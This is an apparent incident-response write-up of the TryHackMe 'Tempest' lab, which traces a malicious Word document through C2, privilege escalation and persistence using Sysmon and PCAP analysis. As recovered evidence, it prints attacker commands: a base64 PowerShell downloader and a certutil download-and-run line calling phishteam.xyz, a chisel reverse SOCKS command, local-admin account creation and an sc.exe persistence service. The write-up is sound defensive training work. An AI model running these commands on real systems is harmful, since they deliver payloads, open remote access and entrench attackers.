# Tempest Ransomware Precursor – Full Incident Report

## **Objectives**

- Investigate and document a full compromise of the **Tempest machine**, tracing the entire attack chain from **initial access** to **persistence**.
- Identify the **malicious document**, **payloads**, **C2 infrastructure**, and **attacker activity** using endpoint and network artefacts.
- Reconstruct the attack timeline and gather evidence of exploitation, privilege escalation, and persistence.

## **Tools Used**

- **VM -** [https://tryhackme.com/room/tempestincident](https://tryhackme.com/room/tempestincident)
- **EvtxECmd & Timeline Explorer** – parsed and analyzed Sysmon and Windows event logs.
- **SysmonView** – visualized process relationships and event correlations.
- **Wireshark & Brim** – examined PCAP files for HTTP, DNS, and C2 communications.
- **CyberChef** – decoded base64 payloads, commands, and exfiltrated data.
- **VirusTotal & Whois** – validated hashes, domains, and IP ownership.
- **PowerShell** – calculated SHA256 hashes and verified artefact integrity.

---

# [Investigation]

## Overview

As part of this project, I was tasked with conducting a **forensic investigation** on a workstation affected by a **full attack chain**. The objective of this analysis was to identify, analyze, and document the sequence of malicious activities that occurred on the compromised system, referred to as the **Tempest machine**.

In this scenario, I acted as one of the **Incident Responders (IRs)** responsible for handling and analyzing the captured artefacts from the affected endpoint. The goal was to reconstruct the incident timeline, identify Indicators of Compromise (IOCs), and determine the methods used by the attacker to infiltrate and exploit the machine.

## Objective

The primary objective of this investigation was to:

- Analyze **endpoint** and **network logs** collected from the compromised Windows workstation.
- Identify the **attack vector**, **malicious payloads**, and **attacker activities**.
- Understand the **complete attack chain** and provide evidence-based conclusions.

This project allowed me to apply real-world digital forensics and incident response (DFIR) methodologies to uncover how the attack unfolded.

## Prerequisites and Skills Applied

Before beginning this investigation, I ensured I had the necessary foundational knowledge and tools for endpoint and network analysis. The skills and techniques I applied were developed through studying and practicing in the following TryHackMe rooms:

- **Windows Event Logs** – for examining system, security, and application event logs.
- **Sysmon** – for detailed system monitoring, including process creation, network connections, and registry events.
- **Wireshark: Packet Operations** – for analyzing packet captures and identifying malicious traffic patterns.
- **Brim** – for high-level network flow and connection analysis using Zeek logs.

These skills collectively equipped me to perform deep-dive analysis into the Tempest machine’s activities and uncover malicious behavior hidden within its logs.

## Investigation Environment

The investigation was conducted within a **controlled Windows analysis environment** provided as part of the exercise. I accessed the virtual machine through the **TryHackMe interface**, which allowed me to interact with the compromised host directly.

**Machine Details:**

- **Machine Name:** Tempest
- **Machine IP:** `10.201.4.206`
- **Username:** `user`
- **Password:** `Investigatem3!`

I initiated the machine using the **Start Machine** option on the TryHackMe platform. The system booted in a split-screen configuration, allowing me to perform live analysis without needing additional configurations.

For external RDP access, I also had the option to connect using the provided credentials. The environment initialization took approximately one minute before the assigned IP address became active.

---

# Task 2: Preparation Phase – Log Analysis

## Introduction

Before beginning the investigation, I prepared by revisiting two crucial concepts that form the foundation of digital forensics and incident response (DFIR): **Log Analysis** and **Event Correlation**. These principles guided my approach in understanding, correlating, and interpreting system events during the Tempest machine investigation.

## Log Analysis

Log analysis is the process I used to **examine system-generated events** to detect anomalies such as security threats, performance issues, or abnormal user activity. In any organization, logs act as an **audit trail**, recording every significant activity that occurs across endpoints, applications, and networks.

Each log entry typically includes details such as:

- **Timestamps** (when the event occurred)
- **System messages**
- **Authentication attempts**
- **Network connections**
- **Application behaviors**

These logs are invaluable in forensic investigations, as they allow me to **reconstruct the sequence of actions** taken on a system and identify suspicious or unauthorized events.

During my investigation, I leveraged this principle to track attacker movements, analyze process creation events, and monitor network activity to identify malicious connections or payload executions.

## Event Correlation

Event correlation involves connecting **related artefacts** across multiple log sources to uncover the full picture of an incident. This technique was essential in my workflow, as it allowed me to identify **relationships between logs** that might otherwise appear isolated.

For example, a single network connection could appear in multiple sources, such as:

- **Sysmon Logs (Event ID 3 – Network Connection):** Reveals which process initiated the connection and which user executed it.
- **Firewall Logs:** Provides network-level details such as source/destination IPs, ports, protocols, and whether the connection was allowed or blocked.

By correlating these two data points, I was able to extract the following unified view:

- **Source IP and Destination IP**
- **Source Port and Destination Port**
- **Protocol Used**
- **Action Taken (Allowed/Blocked)**
- **Process Name Initiating the Connection**
- **User Account Associated with the Process**
- **Machine Name or Host Identifier**

Through this approach, I could **connect the dots** across different event sources, forming a clear narrative of attacker activity. Event correlation essentially allowed me to assemble fragmented pieces of evidence into a complete and coherent incident timeline — transforming raw log data into actionable intelligence.

---

# Task 3: Preparation Phase – Tools and Artefacts

## Overview

Before beginning the investigation, I prepared the **necessary artefacts** and **forensic tools** required to perform an in-depth analysis of both endpoint and network evidence. This preparation ensured the integrity of the provided files and established a structured methodology for handling and examining logs in a professional incident response workflow.

## Artefact Verification by Hash

One of the most critical preparatory steps was to **verify the integrity of the provided artefacts** using cryptographic hash comparison. This step ensured that the files had not been tampered with and were in their original, expected state.

```powershell
PS C:\Users\user> cd '.\Desktop\Incident Files\'
PS C:\Users\user\Desktop\Incident Files> ls
```

The directory contained the following investigation artefacts:

| File Name | File Size (Approx.) | Description |
| --- | --- | --- |
| capture.pcapng | 17,479,060 bytes | Network packet capture |
| sysmon.evtx | 3,215,360 bytes | Sysmon event log |
| windows.evtx | 1,118,208 bytes | Windows event log |

I executed the following PowerShell commands to calculate the SHA256 hash values for each file located in the *Incident Files* directory on the desktop:

```powershell
PS C:\Users\user\Desktop\Incident Files> Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

**Output:**

```
Algorithm : SHA256
Hash      : CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
Path      : C:\Users\user\Desktop\Incident Files\capture.pcapng
```

By verifying the hash values, I confirmed that the artefacts were consistent with the expected files, ensuring the evidence remained authentic and admissible for analysis.

## Toolset Preparation

The investigation required a set of specialized tools to analyze both endpoint and network data. Each tool was selected based on its reliability and relevance to the artefacts provided.

### **1. Endpoint Log Analysis Tools**

These tools were used to examine Windows Event Logs (`windows.evtx`) and Sysmon Logs (`sysmon.evtx`):

- **EvtxEcmd** – Command-line tool by *Eric Zimmerman* for parsing EVTX logs into readable formats such as CSV, JSON, or XML.
- **Timeline Explorer** – GUI-based analysis tool (also by Eric Zimmerman) used to view and filter large log datasets efficiently.
- **SysmonView** – Visual analysis tool for graphically mapping Sysmon events related to specific processes.
- **Event Viewer** – Built-in Windows utility for manually reviewing and exporting event logs, particularly for XML data preparation.

### **2. Network Log Analysis Tools**

To examine the `capture.pcapng` packet capture, I used:

- **Wireshark** – For deep packet inspection, protocol analysis, and session tracking.
- **Brim** – For summarizing network flow data and quickly identifying suspicious network activities.

![image.png](image.png)

All of these tools were preinstalled and accessible directly via the taskbar in the provided investigation environment.

## EvtxEcmd and Timeline Explorer Usage

To prepare the event logs for analysis, I first converted the raw EVTX files into CSV format using **EvtxEcmd**, allowing them to be imported into **Timeline Explorer** for filtering and review.

Command executed:

```powershell
PS C:\Tools\EvtxECmd> .\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

**Process Summary:**

- Loaded 383 event maps.
- Processed 42 log chunks.
- Found 2,559 total event records without errors.
- Generated CSV output: `sysmon.csv`.

Event breakdown:

| Event ID | Description (Sysmon Event Type) | Count |
| --- | --- | --- |
| 1 | Process Creation | 238 |
| 3 | Network Connection | 92 |
| 11 | File Creation | 1,024 |
| 13 | Registry Modification | 869 |
| 22 | DNS Query | 136 |

After exporting, I opened the CSV file in **Timeline Explorer** (`File > Open > sysmon.csv`) to visually filter, sort, and search through logs by specific event types, process names, or network indicators.

![image.png](image%201.png)

![image.png](image%202.png)

This combination of tools allowed me to perform both **broad data exploration** and **targeted forensic filtering** efficiently.

## SysmonView Usage

I also used **SysmonView** to visualize correlated Sysmon events in an interactive interface. Before loading data into SysmonView, I exported Sysmon logs from the **Event Viewer** in XML format.

**Steps Followed:**

1. Opened Event Viewer → *Sysmon Operational Logs*.
2. Chose **Export → XML** format.
    
    ![image.png](image%203.png)
    
3. Imported the exported file into SysmonView (`File > Import Sysmon Event Logs`).
    
    ![image.png](image%204.png)
    
4. Used the left sidebar search function to filter for specific processes (e.g., `explorer.exe`).
5. Selected the image path and session GUID to render the event correlation view.

SysmonView visually mapped process relationships, enabling me to trace **process creation hierarchies**, **network connections**, and **registry modifications** linked to suspicious activity.

## Observations

### SHA256 hash of the capture.pcapng file:

![image.png](image%205.png)

Answer: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`

### SHA256 hash of the sysmon.evtx file:

- I wrote `cmd` in the path to open terminal from this folder:
    
    ![image.png](image%206.png)
    
- Then I wrote `powershell` to get into the **PowerShell** environment.
    
    ![image.png](image%207.png)
    
- Command I used:
    
    ```
     Get-FileHash -Algorithm SHA256 .\sysmon.evtx
    ```
    
    ![image.png](image%208.png)
    

Answer: `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`

### SHA256 hash of the windows.evtx file:

```
 Get-FileHash -Algorithm SHA256 .\windows.evtx
```

![image.png](image%209.png)

Answer: `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

---

# Task 4: Initial Access Phase – Malicious Document Execution

## Incident Overview

During this stage of the investigation, I analyzed the **initial access vector** that triggered the compromise on the *Tempest* workstation. The alert, triaged by one of our **Security Operations Center (SOC)** analysts, was classified as **CRITICAL severity** due to its potential for full system compromise.

According to the initial SOC report, the **intrusion began through a malicious Microsoft Word document** that executed a sequence of commands resulting in code execution on the system. My role as the Incident Responder was to confirm, trace, and reconstruct the attack chain initiated by this document using available endpoint telemetry — specifically the **Sysmon event logs**.

## Initial Findings from SOC

The SOC analyst provided the following key findings from the alert summary:

- The malicious file was a **`.doc` document**.
- The document was **downloaded via `chrome.exe`**, suggesting that the user retrieved it from a web source rather than email.
- Once opened in **`WinWord.exe`**, the document **executed multiple commands**, leading to successful **code execution**.

This early information helped narrow the scope of my analysis and establish the starting point for log correlation and process tracking.

## Investigation Plan and Methodology

To effectively uncover how the malicious document gained execution privileges, I followed a **structured forensic methodology** guided by the internal incident response cheatsheet. The focus was on examining **Sysmon Event Logs** to reconstruct the chain of process executions and associated network activity.

### **Primary Data Source:**

- **Sysmon Logs (`sysmon.evtx`)**

### **Primary Tools Used:**

- **EvtxEcmd** – for parsing Sysmon logs into CSV format.
- **Timeline Explorer** – for filtering, sorting, and correlating events efficiently.
- **SysmonView** – for visual mapping of process relationships involving WinWord.exe.

## Observations

### The user of this machine was compromised by a malicious document. What is the file name of the document?

- To open the `sysmon.evtx` in **Timeline Viewer** I have to first convert the `evtx` into a `csv` format.
- So I went inside the folder which had the **EvtxEcmd** tool.
    
    ![image.png](image%2010.png)
    
- Opened terminal, and used the following command to convert the `evtx` file and save it as a  `csv`:
    
    ```
    .\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
    ```
    
    ![image.png](image%2011.png)
    
    ![image.png](image%2012.png)
    
- Now I can load the exported CSV file inside the **Timeline Explorer** tool.
    
    ![image.png](image%2013.png)
    
    Once the logs are loaded, I can start using input field to filter what I am searching for.
    
    ![image.png](image%2014.png)
    
- It has been reported by the SOC analyst that the file I am looking for is has a **doc** extension and was downloaded using **chrome.exe**.
    
    ![image.png](image%2015.png)
    
- Searched for keyword **.doc**, because that’s the extension of the malicious document.
    
    ![image.png](image%2016.png)
    

Answer: `free_magicules.doc`

### What is the name of the compromised user and machine?

[*Format: username-machine name]*

- Just scrolled to the left in the same row until I found the username column:
    
    ![image.png](image%2017.png)
    

Answer: `benimaru-tempest`

### What is the PID of the Microsoft Word process that opened the malicious document?

- What I know so far:
    - **User Name** = TEMPEST\benimaru (the compromised user)
    - **Image** = winword.exe (Because the victim downloaded the .doc file, which is usually opened with the creation of winword.exe)
    - **Event Id** = 1 (Process creation ID is 1. I need to check when the process creation is taking place to run the winword.exe to open the doc file.)
- Based on the info I have, I applied the following filters in **Timeline Explorer**:
    
    ![image.png](image%2018.png)
    
    Found this column with the executable info revealing that this process used **WINWORD.EXE** to open the malicious **.doc** file.
    
    ![image.png](image%2019.png)
    
- I scrolled left in the same row until I found the **ProcessID.**
    
    ![image.png](image%2020.png)
    

Answer: `496`

### Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

- **User Name =** TEMPEST\benimaru
- **Sysmon Events ID** that can contain the IP :
    - 22 (DNS Query)
    - 3 (Network connection)
- We know the **ProcessID** from the previous task = 496.
- Using these as a filter:
    
    ![image.png](image%2021.png)
    
    ![image.png](image%2022.png)
    

Answer: `167.71.199.191`

### What is the base64 encoded string in the malicious payload executed by the document?

- This mentions something being invoked by the document, so its safe to assume the Parent **PID is 496**, because it was the **Process ID** of the Microsoft Word process that opened the malicious document.
- So, what I know:
    - **ParentProcessID = 496**
    - Event Id = 1 (Process is being created to execute the malicious payload)
- Identity the column where **ParentProcessID** can be found.
    
    ![image.png](image%2023.png)
    
    Which is **Payload Data5** column in my case.
    
- Applied the filter:
    
    ![image.png](image%2024.png)
    
- Then head to the **Executable Info** column.
    
    ![image.png](image%2025.png)
    

Answer: **`“**JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==”`

### What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

![image.png](image%2026.png)

Answer: `2022-30190`

---

# Task 5: Initial Access – Stage 2 Execution (Malicious Document)

Based on my initial findings from the Tempest incident, I identified that the malicious document triggered a **Stage 2 execution** phase. During this phase, I observed that the document successfully executed an **encoded Base64 command**, which upon decoding, revealed the **exact command chain** initiated by the document to gain code execution on the host.

## Investigation Approach

Following this discovery, I referred to the investigation cheatsheet to guide the next steps of my analysis. The **Autostart execution** was identified to have **`explorer.exe`** as its **parent process**, indicating that the payload likely leveraged an explorer process for persistence or command execution.

To further investigate this, I focused on identifying **child processes spawned by `explorer.exe`** within the relevant event timeframe. These processes were potential indicators of malicious post-exploitation activity initiated after the initial infection.

## Key Event Focus

To correlate and validate the Stage 2 execution activity, I concentrated on the following Sysmon event types:

- **Event ID 1 – Process Creation:** to identify all newly created processes following the malicious document execution.
- **Event ID 11 – File Creation:** to detect any newly dropped or modified files that may correspond to payloads or scripts executed during the second stage.

By examining these specific events, I could trace the continuation of the attack chain beyond the initial document execution and map out the progression of malicious activity during Stage 2.

## Observations

### The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

- Filtered the `EventId` column with `11` because Sysmon Event ID = 11 is for **FileCreate**, which can contain the created file path (`TargetFilename` / `FileName`)

![image.png](image%2027.png)

- Filtered the `UserName` column with **TEMPEST\benimaru** to narrow down the results.
    
    ![image.png](image%2028.png)
    
- Then identified which column shows file names (often `TargetFilename`, `FileName`, or `Details`) type part of the filename. It was **Payload Data4** column in my case:
    
    ![image.png](image%2029.png)
    
- Some of the most likely payload write locations are:
    
    `AppData\Local\Temp`, `\AppData\Roaming`, `\AppData\Local`, `\ProgramData`, `Downloads`, `Desktop`, `Startup`, etc.
    
    So I searched for these terms in column filters, and found out that the TargetFileName contains the Startup Directory. 
    
    ![image.png](image%2030.png)
    

Answer: `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

### The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

*Format: Remove the double quotes from the log.*

![image.png](image%2031.png)

- Filter I applied based on what I know:
    - parent process = explorer
    - user = benimaru
    - EventId = 1
        
        ![image.png](image%2032.png)
        
- One of the rows clearly stands out:
    
    ![image.png](image%2033.png)
    

Answer: 

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f '[http://phishteam.xyz/02dcf07/first.exe](http://phishteam.xyz/02dcf07/first.exe)' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`

### Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

![image.png](image%2034.png)

- We are interested in the child process, which is `first.exe` as found in the previous question. Let’s look at the **Executable Info** column.
    
    ![image.png](image%2035.png)
    
- Now I scroll left and view the **Payload Data3** column as it contains the SHA256 hash:
    
    ![image.png](image%2036.png)
    

Answer: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`

### The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

[*Format: domain:port]*

- In the Event ID, I set filter for 1 (process create)
    
    ![image.png](image%2037.png)
    
- Identified the column where I can filter by **ParentProcess:**
    
    ![image.png](image%2038.png)
    
- Then filtered by the executable name `first.exe`
    
    ![image.png](image%2039.png)
    
- Then went to the **Executable Info** column and found some recon/discovery followed by an outbound connection established using `ch.exe`.
    
    ![image.png](image%2040.png)
    
- Now lets identify DNS requests from the parent `first.exe`.
    - Filter by Event ID = 22 (DNS requests)
        
        ![image.png](image%2041.png)
        
    - Filtered for `first.exe`
        
        ![image.png](image%2042.png)
        

Answer: `resolvecyber.xyz:80`

---

# Initial Access – Malicious Document Traffic

During the analysis of the Tempest incident, I identified that the **attacker fetched the Stage 2 payload remotely**. This was confirmed through the **Sysmon logs**, which recorded clear network activity initiated by the malicious document.

From the logs, I discovered both the **domain and IP address** that were invoked by the malicious document during its execution. In addition, I found that the **Stage 2 payload** utilized another **distinct domain and IP**, also logged within the same data source. These findings confirmed that external communication occurred as part of the attack chain.

## Investigation Approach

Since the activity involved network-based artefacts, I proceeded to perform **network log analysis** to validate and expand on these findings. Following the investigation cheatsheet, I used both **Brim** and **Wireshark** to analyze the provided packet capture file and uncover traffic patterns related to the identified domains and IP addresses.

### **Tools Used:**

- **Brim:** for filtering network flows and isolating HTTP traffic related to the malicious connections.
- **Wireshark:** for packet-level inspection and verifying data exchanges between the host and the attacker-controlled servers.

### **Filter Example Used in Brim:**

```bash
_path=="http" "<malicious domain>"
```

This filter allowed me to efficiently locate HTTP requests and responses associated with the domains previously identified in the Sysmon logs.

## Data Source

- **Packet Capture (PCAP)**

## Observations

### What is the URL of the malicious payload embedded in the document?

- First I opened the packet capture in Wireshark.
    
    ![image.png](image%2043.png)
    
- Command I ran:
    
    ```
    http.host==phishteam.xyz && http.reqiest.method=GET
    ```
    
    ![image.png](image%2044.png)
    

Answer: `http://phishteam.xyz/02dcf07/index.html`

### What is the encoding used by the attacker on the c2 connection?

- Based on the questions in previous task, we already know the secondary domain. So, let’s reuse the same command but for this link.
    
    ![image.png](image%2045.png)
    
    After the **`?q=`** param is the data of interest, which looks like some kind of encoding (**base64**).
    
- To confirm it, I am going to copy it and paste it in Cyberchef and see if I get a readable text after using base64 to decode it.
    
    ![image.png](image%2046.png)
    
    And it works! Confirming that it is indeed a base64 encoding.
    

Answer: `base64`

### The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

![image.png](image%2047.png)

The parameter is obvious by looking at the URL.

Answer: `q`

### The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

![image.png](image%2048.png)

Answer: `/9ab62b5`

### What is the HTTP method used by the binary?

![image.png](image%2049.png)

Answer: `GET`

### Based on the user agent, what programming language was used by the attacker to compile the binary?

[*Format: Answer in lowercase]*

![image.png](image%2050.png)

Answer: `nim`

---

# Discovery – Internal Reconnaissance

During this phase of the Tempest incident analysis, I identified that the **malicious binary maintained persistent Command-and-Control (C2) communication**. The captured network traffic revealed that the attacker was actively issuing commands to the compromised system and receiving their corresponding outputs through the same C2 channel.

Upon closer inspection, I found that portions of the traffic contained **encoded strings**, which could be easily decoded to reveal the **exact commands executed** by the attacker. This confirmed that the binary was being used for **interactive remote control and reconnaissance activities** within the internal environment.

## Investigation Approach

To further investigate this behavior, I focused on correlating both **network events** and **process creation logs** that pointed to the same **malicious domain**. My objective was to trace:

- All active connections associated with the C2 infrastructure.
- Any **encoded commands** transmitted through HTTP requests.
- Evidence of **system enumeration or discovery commands** executed from the infected endpoint.

### **Tools and Techniques Used:**

- **Brim:** for analyzing and filtering HTTP traffic containing encoded command strings.
- **Sysmon Logs:** for correlating process creation and network connection events linked to the malicious binary.

## Brim Filters Used

To isolate all HTTP requests related to the identified C2 activity, in Brim:

```bash
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```

Extracts the relevant C2 communications chronologically, highlighting the commands sent and their encoded payloads.

## Significant Data Sources

- **Packet Capture (PCAP)**
- **Sysmon Logs**

## Observations:

### The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

- Right click on the packet, and follow TCP stream.
    
    ![image.png](image%2051.png)
    
- Copy the encoded strings, remove the junk, and paste it it cyberchef or any base64 decoder online.
    
    ![image.png](image%2052.png)
    
    ![image.png](image%2053.png)
    
    ![image.png](image%2054.png)
    

Answer: `infernotempest`

### The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

- Keep copying the encoded message and decoding it, until you find the one showing the network logs.
    
    ![image.png](image%2055.png)
    
    ![image.png](image%2056.png)
    
    ![image.png](image%2057.png)
    

Answer: `5985`

Why? Because this port is used for Powershell Remoting, and can be used by attackers.

![image.png](image%2058.png)

### The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

[*Format: Remove the double quotes from the log.]*

- Found this previously when analyzing the **sysmon.evtx** file using **Timeline Explorer**.
    
    ![image.png](image%2059.png)
    

Answer: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`

### What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

In the same row, keep scrolling to the left until you see the hash.

Answer: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`

### What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

- Analyze the hash in VirusTotal.
    
    ![image.png](image%2060.png)
    
    ![image.png](image%2061.png)
    

Answer: `chisel`

### The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

[*Format: Answer in lowercase]*

- The succeeding process after the execution of the socks proxy:
    
    ![image.png](image%2062.png)
    
    Now that the process name (`wsmprovhost.exe`) is identified. Which is a legitimate windows process, I need to find out the name of the service.
    
- I searched on google which service is associated with this process and got the answer.
    
    ![image.png](image%2063.png)
    

Answer: `WinRM`

---

# Privilege Escalation – Exploiting Privileges

From the findings gathered during the investigation, I determined that the **attacker successfully established a stable shell** on the compromised Tempest machine through a **reverse SOCKS proxy connection**. This confirmed that the adversary had achieved a persistent foothold within the system, allowing continuous remote access for further exploitation.

## Investigation Approach

With this discovery, I focused on examining both **network and endpoint activity** that occurred immediately after the successful execution of the reverse SOCKS proxy tool. My objective was to identify **privilege escalation attempts** that could indicate the attacker’s effort to move from a low-privilege context to higher system-level privileges.

### **Key Focus Areas:**

- **Sysmon Logs:** to detect suspicious process creation or privilege modification activities.
- **Packet Capture (PCAP):** to trace outbound communications linked to the established reverse proxy tunnel.

By correlating these two data sources, I aimed to pinpoint **escalation vectors** such as the execution of administrative commands, system configuration changes, or exploitation attempts targeting privilege misconfigurations.

## Significant Data Sources

- **Packet Capture (PCAP)**
- **Sysmon Logs**

## Observations:

### After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

*Format: binary name,SHA256 hash*

- Still in **Timeline Explorer**, we know what the parent process is:
    
    ![image.png](image%2064.png)
    
- Identify the column where **ParentProcess** can be filtered, which was **Payload Data4** for me.
    
    ![image.png](image%2065.png)
    
- Then filter this column to the **wsmprovhost.exe** and close.
    
    ![image.png](image%2066.png)
    
- Now go back to the **Executable Info** column, and you’ll notice 4 new things.
    
    ![image.png](image%2067.png)
    
    - First the user wanted to check what his privileges are.
    - Then he downloadeds `spf.exe`, and then `final.exe`
    - Then he runs both of those together
        
        ![image.png](image%2068.png)
        
- Now to find the hash value of this `spf.exe` just scroll to the left of the last row.
    
    ![image.png](image%2069.png)
    

Answer: `spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

### Based on the SHA256 hash of the binary, what is the name of the tool used?

- Go to VirusTotal and paste the hash value.
    
    ![image.png](image%2070.png)
    

Answer: `printspoofer`

### The tool exploits a specific privilege owned by the user. What is the name of the privilege?

Github repo from Google search: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

![image.png](image%2071.png)

Answer: `SeImpersonatePrivilege`

### Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

- Go back to the **Timeline Explorer** where we left it, and just scroll right back to the **Executable Info** column.
    
    ![image.png](image%2072.png)
    

Answer: `final.exe`

### The binary connects to a different port from the first c2 connection. What is the port used?

That can be seen in the screenshot which I took when we found the c2 connection for the first time in **Timeline Explorer**.

![image.png](image%2073.png)

Answer: `8080`

---

# Actions on Objective – Fully-Owned Machine

At this stage of the Tempest investigation, I confirmed that the **attacker had successfully obtained administrative privileges** within the compromised system. Operating under **SYSTEM-level access**, the adversary had complete control of the host and began deploying **persistence mechanisms** to maintain long-term access.

Additionally, I observed a series of **unusual executions** associated with the **malicious C2 binary** that was previously used during the privilege escalation phase. These executions indicated that the attacker continued to interact with the C2 infrastructure while leveraging elevated privileges to perform system-level actions.

## Investigation Approach

To analyze the attacker’s post-exploitation behavior, I focused on identifying all persistence-related events and tracing the activity of the **C2 binary** after privilege escalation. I utilized both endpoint and network artefacts to determine how persistence was achieved and how the attacker maintained communication with their external infrastructure.

### **Tools and Techniques Used:**

- **Brim:** to filter network communications related to the C2 server.
- **Sysmon Logs:** to identify process creation and registry modification events indicating persistence.
- **Windows Event Logs:** to confirm privilege escalation context changes and service-level modifications.

## Significant Data Sources

- **Packet Capture (PCAP)**
- **Sysmon Logs**
- **Windows Event Logs**

## Observations:

### Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

*Format: Answer in alphabetical order - comma delimited*

- Go back to wireshark and keep decoding the encoded messages one by one in cyberchef. Make sure to set the port as `8080.`
    
    ![image.png](image%2074.png)
    
- One of the decoded texts will reveal this information, which has the answer.
    
    ![image.png](image%2075.png)
    

Answer: `shion, shuna`

### Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

- Keep decoding the encoded texts in cyberchef one by one in order:
    
    ![image.png](image%2076.png)
    

Answer: `/add`

### Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

![image.png](image%2077.png)

Answer: `4720`

### The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

![image.png](image%2078.png)

Answer: `net localgroup administrators /add shion`

### Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

![image.png](image%2079.png)

Answer: `4732`

### After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

*Format: Remove the double quotes from the log.*

- Remember that the attacker gained system privileges, so whatever they do is now done via the **NT Authority\System** user.
    
    ![image.png](image%2080.png)
    
- Go back to the **T**i**meline Explorer,** and then filter the **User Name** column with user **NT Authority\System**.
    
    ![image.png](image%2081.png)
    
- Then go to the **Executable Column** and look for things that are using the Windows\**System32** elements.
    
    ![image.png](image%2082.png)
    
    `sc.exe` is being used to create a new service which is setting the binpath to `final.exe`.
    
- Copy it and paste it as answer after removing the double quotes.
    
    ![image.png](image%2083.png)
    

Answer: `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`

---

# **Lessons Learned**

- Even a **single malicious document (.doc)** can trigger a full multi-stage compromise if macros or script execution aren’t restricted.
- **Sysmon logging** is critical — Event IDs (1, 3, 11, 13, 22) provide the most valuable insight into an attacker’s movements.
- **Event correlation** between process creation, DNS queries, and network traffic enables precise attack reconstruction.
- Attackers often rely on **living-off-the-land binaries (LOLBins)** like `certutil.exe`, `powershell.exe`, and `sc.exe` to avoid detection.
- **Persistence** through new service creation and user accounts highlights the importance of continuous **privilege auditing**.
- Combining endpoint forensics with network analysis (Sysmon + PCAP) offers a **complete view of attacker behavior** and post-exploitation actions.

# Socials

**Repository:** https://github.com/RahulCyberX/SOC-Analyst-Portfolio/

**Medium Article:** https://rahulcyberx.medium.com/tempest-soc-level-1-capstone-challenge-thm-54def2456dfa

**TryHackMe Profile:** https://tryhackme.com/p/0xRahuL

**Github Profile:** https://github.com/RahulCyberX
